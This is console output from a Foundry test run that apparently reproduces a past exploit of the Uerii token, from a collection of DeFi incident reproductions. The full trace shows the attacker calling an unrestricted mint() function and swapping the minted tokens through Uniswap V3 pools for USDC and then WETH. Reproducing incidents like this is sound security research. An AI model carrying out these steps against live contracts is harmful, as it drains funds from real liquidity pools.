Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.19s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 228.23ms (274.87µs CPU time)

Ran 1 test for src/test/2022-10/Uerii_exp.sol:ContractTest
[PASS] testExploit() (gas: 2584508)
Logs:
  [Start] Attacker WETH balance before exploit: 0.000000000000000000
  [End] Attacker WETH balance after exploit: 1.855150444286128408

Traces:
  [2609208] ContractTest::testExploit()
    ├─ [2534] WETH_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker WETH balance before exploit", val: 0, decimals: 18)
    ├─ [30122] UERII_TOKEN::mint()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000 [1e17])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [25249] UERII_TOKEN::approve(UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [863] UERII_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 100000000000000000 [1e17]
    ├─ [2416072] UNI_ROUTER::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE, tokenOut: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1666009859 [1.666e9], amountIn: 100000000000000000 [1e17], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [2408640] UERII_USDC_PAIR::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 100000000000000000 [1e17], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b418c24191ae947a78c99fdc0e45a1f96afb254be0001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
    │   │   ├─ [44017] USDC_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2447241739 [2.447e9])
    │   │   │   ├─ [36728] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2447241739 [2.447e9]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2447241739 [2.447e9])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2863] UERII_TOKEN::balanceOf(UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC]) [staticcall]
    │   │   │   └─ ← [Return] 10797575730000571 [1.079e16]
    │   │   ├─ [13845] UNI_ROUTER::uniswapV3SwapCallback(2425482740776 [2.425e12], -2447241739 [-2.447e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b418c24191ae947a78c99fdc0e45a1f96afb254be0001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
    │   │   │   ├─ [9789] UERII_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC], 2425482740776 [2.425e12])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC], value: 2425482740776 [2.425e12])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584005487646899159 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [863] UERII_TOKEN::balanceOf(UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC]) [staticcall]
    │   │   │   └─ ← [Return] 10800001212741347 [1.08e16]
    │   │   ├─ emit Swap(param0: UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 2425482740776 [2.425e12], param3: -2447241739 [-2.447e9], param4: 4295128740 [4.295e9], param5: 0, param6: -887272 [-8.872e5])
    │   │   └─ ← [Return] 2425482740776 [2.425e12], -2447241739 [-2.447e9]
    │   └─ ← [Return] 2447241739 [2.447e9]
    ├─ [27867] USDC_TOKEN::approve(UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [27078] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::approve(UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [1315] USDC_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 2447241739 [2.447e9]
    │   └─ ← [Return] 2447241739 [2.447e9]
    ├─ [87960] UNI_ROUTER::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1666009859 [1.666e9], amountIn: 2447241739 [2.447e9], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [80528] USDC_WETH_PAIR::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 2447241739 [2.447e9], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
    │   │   ├─ [27962] WETH_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1855150444286128408 [1.855e18])
    │   │   │   ├─ emit Transfer(from: USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1855150444286128408 [1.855e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3315] USDC_TOKEN::balanceOf(USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [delegatecall]
    │   │   │   │   └─ ← [Return] 53744284434404 [5.374e13]
    │   │   │   └─ ← [Return] 53744284434404 [5.374e13]
    │   │   ├─ [14848] UNI_ROUTER::uniswapV3SwapCallback(2447241739 [2.447e9], -1855150444286128408 [-1.855e18], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000)
    │   │   │   ├─ [10792] USDC_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 2447241739 [2.447e9])
    │   │   │   │   ├─ [9997] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 2447241739 [2.447e9]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], value: 2447241739 [2.447e9])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [1315] USDC_TOKEN::balanceOf(USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [delegatecall]
    │   │   │   │   └─ ← [Return] 53746731676143 [5.374e13]
    │   │   │   └─ ← [Return] 53746731676143 [5.374e13]
    │   │   ├─ emit Swap(param0: UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 2447241739 [2.447e9], param3: -1855150444286128408 [-1.855e18], param4: 2181919935371318389951909890091607 [2.181e33], param5: 28908379364552406182 [2.89e19], param6: 204477 [2.044e5])
    │   │   └─ ← [Return] 2447241739 [2.447e9], -1855150444286128408 [-1.855e18]
    │   └─ ← [Return] 1855150444286128408 [1.855e18]
    ├─ [534] WETH_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1855150444286128408 [1.855e18]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker WETH balance after exploit", val: 1855150444286128408 [1.855e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.09s (18.86s CPU time)

Ran 2 test suites in 19.09s (19.32s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
